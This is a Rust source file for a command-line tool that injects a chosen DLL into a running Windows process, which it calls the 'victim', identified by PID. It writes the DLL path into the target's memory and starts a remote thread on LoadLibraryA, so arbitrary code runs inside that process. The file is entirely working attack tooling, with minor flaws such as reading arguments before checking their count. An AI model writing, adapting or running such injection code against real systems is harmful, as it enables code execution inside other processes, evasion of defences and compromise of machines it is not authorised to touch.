use windows::{
    core::*,
    Win32::{
        Foundation::*, 
        System::{
            Diagnostics::Debug::*, 
            LibraryLoader::*, 
            Memory::*, 
            Threading::*
        },
    }
};


fn main() {



    println!("Rust Project : DLL Injection into process via PID");
    
    // Take in PID from argument and convert to u32
    let args: Vec<_> = std::env::args().collect();
    let pid: u32 = args[1].parse().unwrap();
    let dll_path = args[2].as_str();

    if args.len() != 3 {
        eprintln!("Usage: <program> <pid> <dll_path>");
        return;
    }

    println!("Injecting \"{}\" into victim with PID: {}", dll_path,  pid);


    let h: HANDLE;
    // Open Process of victim
    unsafe {
        h = OpenProcess(
            PROCESS_VM_OPERATION | 
            PROCESS_VM_WRITE | 
            PROCESS_QUERY_INFORMATION |
            PROCESS_CREATE_THREAD  |
            PROCESS_VM_READ,
            false,
            pid,
        ).unwrap_or_else(|e| {
            println!("Error: {:?}", e);
            std::process::exit(-1);
        });
    }
    if h.is_invalid() {
        println!("Failed to open process.\nMake sure you have the correct PID.");
        println!("Error: {:?}", unsafe{GetLastError()});
        std::process::exit(-1);
    } else{
        println!("Process opened successfully.");
    }

    // Allocating path of DLL into victim process
    
    let allocated_address:*mut core::ffi::c_void ;
    let lp_address: Option<*const core::ffi::c_void> = None;
    unsafe {
        allocated_address = VirtualAllocEx(
            h, // Get the handle from the Result
            lp_address,
            dll_path.len(),
            MEM_COMMIT|MEM_RESERVE,
            PAGE_READWRITE
        );
    }
    if allocated_address.is_null() {
        println!("Failed to allocate memory in victim process. \nError: {:?}",
         unsafe{GetLastError()});
        std::process::exit(-1);
    }else{
        println!("Memory allocated successfully.");
    }

    
    unsafe {
        let mut lpnumberofbyteswritten: usize = 0;
        
        let result: std::result::Result<(), Error> = WriteProcessMemory(
            h,
            allocated_address,
            dll_path.as_ptr() as *const core::ffi::c_void,
            dll_path.len(),
            Some(&mut lpnumberofbyteswritten)
        );
        
        if result.is_err() {
            println!("Failed to write memory in victim process.Error: {:?}", 
            GetLastError());
            std::process::exit(-1);
        }else{
            println!("Memory written successfully.");
        }
    }

    // Get Address of LoadLibraryA
    let h_kernel32 = unsafe { GetModuleHandleA(s!("kernel32.dll")) };
    let hmodule = h_kernel32.unwrap();
    if hmodule.is_invalid() {
        println!("Failed to load kernel32.dll.");
        return;
    }else{
        println!("kernel32.dll loaded successfully.");
    }
    
    
    let loadlibrary_address = unsafe {
        GetProcAddress(
            hmodule,
            s!("LoadLibraryA")
        )
    };
    
    if loadlibrary_address.is_none() {
        println!("Failed to get address of LoadLibraryA. Error: {:?}", unsafe { GetLastError() });
        std::process::exit(-1);
    } else {
        println!("Address of LoadLibraryA obtained successfully.");
    }
    
    // Create Remote Thread
    let loadlibrary_fn: LPTHREAD_START_ROUTINE = match loadlibrary_address{
        Some(addr) => unsafe { core::mem::transmute(addr) },
        None => {
            println!("Failed to get address of LoadLibraryA. Error: {:?}", unsafe { GetLastError() });
            std::process::exit(-1);
        }
    };

    let h_thread = unsafe {
        CreateRemoteThreadEx(
            h,
            None,
            0,
            loadlibrary_fn,
            Some(allocated_address),
            0,
            None,
            None,
        )
    };
    
    if h_thread.is_err() {
        println!("Failed to create remote thread. Error: {:?}", unsafe { GetLastError() });
        std::process::exit(-1);
    } else {
        println!("Remote thread created successfully.");
    }

    let x: WAIT_EVENT = unsafe {
        WaitForSingleObject(
            h,
            INFINITE
        )
    };

    if x == WAIT_FAILED {
        println!("Failed to wait for single object. Error: {:?}", unsafe { GetLastError() });
        std::process::exit(-1);
    } else {
        println!("Remote thread executed successfully.");
    }


    unsafe {
        let _ = CloseHandle(h);
    }
    return;
}

